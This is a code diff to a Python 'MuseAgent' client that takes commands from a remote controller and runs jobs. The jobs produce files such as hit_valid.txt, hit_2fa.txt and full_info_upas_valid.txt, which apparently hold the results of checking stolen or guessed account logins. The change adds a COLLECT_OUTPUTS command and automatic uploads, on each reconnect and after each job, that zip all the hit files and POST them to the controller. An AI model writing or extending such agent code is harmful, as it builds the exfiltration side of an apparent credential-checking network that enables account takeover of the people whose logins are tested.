@@ -127,6 +127,7 @@ class MuseAgent:
         self.seen_cmds_path = os.path.join(self.state_dir, "seen_cmds.json")
         self.bench_path = os.path.join(self.state_dir, "benchmark.json")
         self._job_lock = threading.Lock()
+        self._archive_lock = threading.Lock()
         self.seen_cmds: deque[str] = self._load_seen_cmds()
         self.proc: subprocess.Popen | None = None
         self.active_job: dict | None = None
@@ -624,6 +625,9 @@ class MuseAgent:
             if ctype == "BENCHMARK":
                 b = self.run_benchmark()
                 return True, f"workers={b['recommended_workers']}"
+            if ctype == "COLLECT_OUTPUTS":
+                ok = self.collect_all_outputs_sync()
+                return True, "outputs synced" if ok else "no outputs"
             if ctype == "SET_INDUK":
                 new_url = str(payload.get("new_induk_url") or "")
                 self.apply_new_induk(new_url)
@@ -714,6 +718,7 @@ class MuseAgent:
                     disconnected_since = None
 
                     async def _sender() -> None:
+                        asyncio.create_task(asyncio.to_thread(self._safe_upload_all_outputs))
                         while not self._reconnect_needed:
                             await asyncio.to_thread(self._safe_sync_manual_job)
                             await asyncio.to_thread(self._safe_flush_hits)
@@ -766,20 +771,60 @@ class MuseAgent:
             pass
 
     @staticmethod
+    def _write_folder_to_zip(zf: zipfile.ZipFile, folder_dir: str, prefix: str = "") -> int:
+        added = 0
+        for fname in ("hit_valid.txt", "hit_2fa.txt", "invalid.txt", "err.txt", "full_info_upas_valid.txt"):
+            fp = os.path.join(folder_dir, fname)
+            if os.path.isfile(fp) and not os.path.islink(fp) and os.path.getsize(fp) > 0:
+                zf.write(fp, arcname=f"{prefix}{fname}")
+                added += 1
+        col_dir = os.path.join(folder_dir, "full_info_by_collector")
+        if os.path.isdir(col_dir) and not os.path.islink(col_dir):
+            for fn in sorted(os.listdir(col_dir)):
+                fp = os.path.join(col_dir, fn)
+                if re.match(r"^[A-Za-z0-9._-]{1,64}\.txt\Z", fn) and os.path.isfile(fp) and not os.path.islink(fp) and os.path.getsize(fp) > 0:
+                    zf.write(fp, arcname=f"{prefix}full_info_by_collector/{fn}")
+                    added += 1
+        return added
+
+    @staticmethod
     def _build_output_zip_bytes(out_dir: str) -> bytes:
         buf = io.BytesIO()
         with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
-            for fname in ("hit_valid.txt", "hit_2fa.txt", "invalid.txt", "err.txt", "full_info_upas_valid.txt"):
-                fp = os.path.join(out_dir, fname)
-                if os.path.isfile(fp) and os.path.getsize(fp) > 0:
-                    zf.write(fp, arcname=fname)
-            col_dir = os.path.join(out_dir, "full_info_by_collector")
-            if os.path.isdir(col_dir):
-                for fn in sorted(os.listdir(col_dir)):
-                    fp = os.path.join(col_dir, fn)
-                    if fn.endswith(".txt") and os.path.isfile(fp) and os.path.getsize(fp) > 0:
-                        zf.write(fp, arcname=f"full_info_by_collector/{fn}")
+            MuseAgent._write_folder_to_zip(zf, out_dir, prefix="")
         return buf.getvalue()
+
+    def collect_all_outputs_sync(self) -> bool:
+        with self._archive_lock:
+            base_out = os.path.join(self.work_dir, "output")
+            if not os.path.isdir(base_out) or os.path.islink(base_out):
+                return False
+            buf = io.BytesIO()
+            added = 0
+            with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+                for folder in sorted(os.listdir(base_out)):
+                    if not _SAFE_ID_RE.match(folder) or ".." in folder:
+                        continue
+                    fdir = os.path.join(base_out, folder)
+                    if not os.path.isdir(fdir) or os.path.islink(fdir):
+                        continue
+                    added += self._write_folder_to_zip(zf, fdir, prefix=f"{folder}/")
+            if added == 0:
+                return False
+            self._http_request_raw(
+                "POST",
+                "/api/v1/agent/outputs-archive",
+                data=buf.getvalue(),
+                content_type="application/zip",
+                timeout=60.0,
+            )
+            return True
+
+    def _safe_upload_all_outputs(self) -> None:
+        try:
+            self.collect_all_outputs_sync()
+        except Exception:
+            pass
 
     def _safe_sync_partial_output(self) -> None:
         try:
@@ -833,6 +878,7 @@ class MuseAgent:
             if self.active_job and self.active_job.get("job_id") == job.get("job_id"):
                 self.active_job["output_uploaded"] = True
                 self.save_active_job(self.active_job)
+        self._safe_upload_all_outputs()
         return True
 
     def _safe_upload_finished_output(self, force: bool = False) -> None:
